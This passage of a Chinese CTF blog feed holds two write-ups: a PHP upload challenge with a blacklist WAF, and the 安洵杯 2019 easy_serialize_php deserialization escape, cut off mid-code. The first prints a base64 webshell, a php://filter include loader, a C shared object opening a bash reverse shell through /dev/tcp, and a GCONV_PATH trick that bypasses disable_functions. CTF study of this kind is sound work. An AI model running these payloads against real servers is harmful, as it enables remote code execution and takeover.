string">"$"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"file"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwriter"</span><span class="token punctuation">,</span><span class="token string">"fput"</span><span class="token punctuation">,</span><span class="token string">"copy"</span><span class="token punctuation">,</span><span class="token string">"curl"</span><span class="token punctuation">,</span><span class="token string">"fread"</span><span class="token punctuation">,</span><span class="token string">"fget"</span><span class="token punctuation">,</span><span class="token string">"function_exists"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"putenv"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"proc_close"</span><span class="token punctuation">,</span> <span class="token string">"proc_get_status"</span><span class="token punctuation">,</span><span class="token string">"checkdnsrr"</span><span class="token punctuation">,</span><span class="token string">"getmxrr"</span><span class="token punctuation">,</span><span class="token string">"getservbyname"</span><span class="token punctuation">,</span><span class="token string">"getservbyport"</span><span class="token punctuation">,</span> <span class="token string">"syslog"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"highlight_file"</span><span class="token punctuation">,</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"chmod"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> True<span class="token punctuation">;</span>    <span class="token punctuation">}</span>        <span class="token keyword">return</span> False<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设置上传目录</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">"UPLOAD_PATH"</span><span class="token punctuation">,</span> <span class="token string">"./uploads"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"Upload Success!"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span><span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/php/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"只要好看的php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"诶，被我发现了吧"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$new_file_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span>        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$new_file_name</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'Upload Failed!'</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string">'&lt;div style="color:#F00">'</span><span class="token punctuation">.</span><span class="token variable">$msg</span><span class="token punctuation">.</span><span class="token string">" Look here~ "</span><span class="token punctuation">.</span><span class="token variable">$img_path</span><span class="token punctuation">.</span><span class="token string">"&lt;/div>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>发现还有WAF</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">:</span> bool<span class="token punctuation">{</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"\$_"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span><span class="token string">"copy"</span> <span class="token punctuation">,</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token string">"usort"</span><span class="token punctuation">,</span><span class="token string">"include"</span><span class="token punctuation">,</span> <span class="token string">"require"</span><span class="token punctuation">,</span> <span class="token string">"$"</span><span class="token punctuation">,</span> <span class="token string">"^"</span><span class="token punctuation">,</span> <span class="token string">"~"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">"%"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">"file"</span><span class="token punctuation">,</span><span class="token string">"fopen"</span><span class="token punctuation">,</span><span class="token string">"fwriter"</span><span class="token punctuation">,</span><span class="token string">"fput"</span><span class="token punctuation">,</span><span class="token string">"copy"</span><span class="token punctuation">,</span><span class="token string">"curl"</span><span class="token punctuation">,</span><span class="token string">"fread"</span><span class="token punctuation">,</span><span class="token string">"fget"</span><span class="token punctuation">,</span><span class="token string">"function_exists"</span><span class="token punctuation">,</span><span class="token string">"dl"</span><span class="token punctuation">,</span><span class="token string">"putenv"</span><span class="token punctuation">,</span><span class="token string">"system"</span><span class="token punctuation">,</span><span class="token string">"exec"</span><span class="token punctuation">,</span><span class="token string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string">"passthru"</span><span class="token punctuation">,</span><span class="token string">"proc_open"</span><span class="token punctuation">,</span><span class="token string">"proc_close"</span><span class="token punctuation">,</span> <span class="token string">"proc_get_status"</span><span class="token punctuation">,</span><span class="token string">"checkdnsrr"</span><span class="token punctuation">,</span><span class="token string">"getmxrr"</span><span class="token punctuation">,</span><span class="token string">"getservbyname"</span><span class="token punctuation">,</span><span class="token string">"getservbyport"</span><span class="token punctuation">,</span> <span class="token string">"syslog"</span><span class="token punctuation">,</span><span class="token string">"popen"</span><span class="token punctuation">,</span><span class="token string">"show_source"</span><span class="token punctuation">,</span><span class="token string">"highlight_file"</span><span class="token punctuation">,</span><span class="token string">"`"</span><span class="token punctuation">,</span><span class="token string">"chmod"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">,</span> <span class="token variable">$blackword</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> True<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> False<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>看到这里是用strstr进行检测，而strstr() 对大小写不敏感，则这里直接用大小写进行绕过。<br>看大佬WP发现：<a href="https://erroratao.github.io/writeup/DASCTF2022xSU/">atao’s blog</a><br>(从这里开始都还未进行复现，搬运了一下大佬的WP，等完了再填坑)<br>可以写一个base.php，内容是base64编码的木马。<br>再写一个shell.php，include另一个base.php，include的时候用Php filter解码。<br>base.php</p><pre class=" language-php"><code class="language-php">PD9waHAgZXZhbCgkX1BPU1RbJzEnXSk7Pz4<span class="token operator">=</span><span class="token shell-comment comment">#&lt;?php eval($_POST[</span><span class="token string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><p>shell.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">Include</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string">'cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0yMmIxZmZhNzk3ZWQwOTk3YTIwNzY1YzdjZjhhNjU0OS5waHA='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#php:</span><span class="token comment" spellcheck="true">//filter/convert.base64-decode/resource=22b1ffa797ed0997a20765c7cf8a6549.php</span><span class="token delimiter">?></span></code></pre><p>由于disable functions太多，蚁剑用不了。看了看putenv没被禁。考虑LD_PRELOAD加载so文件。<br>现在访问第二个文件即可执行任意代码了<br>通过 move_uploaded_file() 函数上传 exp.so 和 gconv-modules ，实现 bypass disable_functions<br>exp.so</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">void</span> <span class="token function">gconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">gconv_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"bash -c 'exec bash -i &amp;>/dev/tcp/ip/port &lt;&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编译成so文件</p><pre class=" language-bash"><code class="language-bash">gcc exp.c -o exp.so -shared -fPIC</code></pre><p>gconv-modules</p><pre class=" language-1"><code class="language-1">module  EXP//    INTERNAL    ../../../../../../../../tmp/exp    2module  INTERNAL   EXP//    ../../../../../../../../tmp/exp    2</code></pre><p>利用下面的 Payload 进行触发 (这边建议进行 URL 编码)</p><pre class=" language-php"><code class="language-php"><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string">"GCONV_PATH=/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.iconv.exp.utf-8/resource=/tmp/exp.so');</span></code></pre><p>拿到 shell 后查看根目录下 flag 的权限，只要 root 可读，需要提权<br>查看 SUID 的命令</p><pre class=" language-bash"><code class="language-bash"><span class="token function">find</span> / -user root -perm -4000 -print 2<span class="token operator">></span>/dev/null</code></pre><p>发现nl命令，利用nl /flag即可提取flag。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pop upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯 2019 easy_serialize_php 1题解</title>
      <link href="/2022/03/15/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_serialize_php%201%E9%A2%98%E8%A7%A3/"/>
      <url>/2022/03/15/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_serialize_php%201%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯-2019-easy-serialize-php-1题解"><a href="#安洵杯-2019-easy-serialize-php-1题解" class="headerlink" title="安洵杯 2019 easy_serialize_php 1题解"></a>安洵杯 2019 easy_serialize_php 1题解</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="extract-变量覆盖"><a href="#extract-变量覆盖" class="headerlink" title="extract()变量覆盖"></a>extract()变量覆盖</h3><p>对于一段php代码，当我们传入SESSION[flag]=123时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。只剩下_SESSION[flag]=123。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>代码的输出为</p><pre class=" language-1"><code class="language-1">array(2){["users"]=>string(5)"guest"["function"]=>NULL}array(1){["flag"]=>string(5)"123"}</code></pre><h3 id="键值逃逸"><a href="#键值逃逸" class="headerlink" title="键值逃逸"></a>键值逃逸</h3><p>原理:因为序列化吼的字符串是严格的，对应的格式不能错，比如s:4:”name”,那s:4就必须有一个字符串长度是4的否则就往后要。并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。<br>对于序列化的字符串</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token shell-comment comment">#正规序列化的字符串</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"a:2:{s:3:\"one\";s:4:\"flag\";s:3:\"two\";s:4:\"test\";}"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#带有多余的字符的字符串</span><span class="token variable">$a_laji</span> <span class="token operator">=</span> <span class="token string">"a:2:{s:3:\"one\";s:4:\"flag\";s:3:\"two\";s:4:\"test\";};s:3:\"真的垃圾img\";lajilaji"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a_laji</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>输出均为</p><pre class=" language-1"><code class="language-1">array(2) { ["one"]=> string(4) "flag" ["two"]=> string(4) "test"}</code></pre><h2 id="题目详解"><a href="#题目详解" class="headerlink" title="题目详解"></a>题目详解</h2><p>打开题目，有source_code，跟进，有源码</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="index.php?f=highlight_file">source_code&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$serialize_info</span> <span class="token operator">=</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>先分析过滤部分</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'php'</span><span class="token punctuation">,</span><span class="token string">'flag'</span><span class="token punctuation">,</span><span class="token string">'php5'</span><span class="token punctuation">,</span><span class="token string">'php4'</span><span class="token punctuation">,</span><span class="token string">'fl1g'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$filter</span> <span class="token operator">=</span> <span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$filter_arr</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/i'</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$filter</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>.implode的作用是将数组变为字符串，相当于php|flag|php5|php4|fl1g，这个函数的作用就是过滤前面这五个字符。<br>然后看这部分</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'highlight_file'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">'phpinfo();'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//maybe you can find something in here!</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$function</span> <span class="token operator">==</span> <span class="token string">'show_image'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$userinfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$serialize_info</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>访问phpinfo找到文件d0g3_f1ag.php。<br><img src="https://kingofkb.github.io/medias/image/20220224/phpinfo.png"><br>最后我们肯定是要利用show_image去获得flag，并且flag应该在d0g3_f1ag.php中，所以只要$userinfo[‘img’]是相应的flag的base64加密，就可以得到flag，所以我们先记住这个点，一会肯定要用。<br>看这段</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">"user"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'guest'</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'function'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span><span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>extract() 函数从数组中将变量导入到当前的符号表，根据extract()我们可以进行变量覆盖。<br>但我们直接进行变量覆盖，直接给$SESSION[‘img’]一个预想的值是不现实的，因为<code>$SESSION['img'] = base64_encode('guest_img.png')</code>是后执行的。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img_path'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>如果我们把$_SESSION[‘img’] = base64_encode(‘guest_img.png’);这段代码的img属性放到花括号外边去，然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。那如何达到这个目的就要通过过滤函数了。<br>构造POST数据</p><pre class=" language-1"><code class="language-1">_SESSION[phpflag]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}</code></pre><p>ZDBnM19mMWFnLnBocA==也就是d0g3_f1ag.php的base64加密。那么 ;s:1:”1”; 这几个字符呢?<br>如果使用大佬的payload那么可以明白，现在的_SESSION就存在两个键值即phpflag和img对应的键值对。并且这个字符串得好好读才能不蒙圈。</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'phpflag'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">";s:1:\"1\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}"</span><span class="token punctuation">;</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string">'guest_img.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#</span><span class="token string">"a:2:{s:7:"</span>phpflag<span class="token string">";s:48:"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token 